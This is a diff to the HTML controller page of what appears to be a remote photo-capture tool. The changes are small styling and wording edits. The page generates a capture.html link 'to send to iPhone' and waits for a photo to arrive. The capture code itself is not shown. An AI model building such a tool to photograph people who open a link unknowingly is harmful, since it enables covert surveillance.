@@ -9,11 +9,12 @@
       color: white;
       text-align: center;
       font-family: sans-serif;
+      padding-top: 50px;
     }
     input {
       padding: 10px;
       font-size: 18px;
-      margin-top: 20px;
+      width: 250px;
     }
     button {
       padding: 10px;
@@ -28,11 +29,11 @@
   </style>
 </head>
 <body>
-  <h2>Enter Key to Monitor</h2>
-  <input type="text" id="keyInput" placeholder="Enter your key">
+  <h2>Enter Your Private Key</h2>
+  <input type="text" id="keyInput" placeholder="e.g. mypass123">
   <button onclick="generateLink()">Generate Link</button>
   <p id="linkDisplay"></p>
-  <img id="photo" src="" alt="Waiting for photo...">
+  <img id="photo" src="" alt="Waiting for photo..." />
 
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
@@ -52,7 +53,7 @@
 
     function generateLink() {
       const key = document.getElementById("keyInput").value.trim();
-      if (!key) return alert("Enter a valid key");
+      if (!key) return alert("Please enter a valid key");
       const link = window.location.origin + "/capture.html?key=" + encodeURIComponent(key);
       document.getElementById("linkDisplay").innerHTML = `<b>Send this link to iPhone:</b><br><a style='color:lime' href="${link}" target="_blank">${link}</a>`;
 
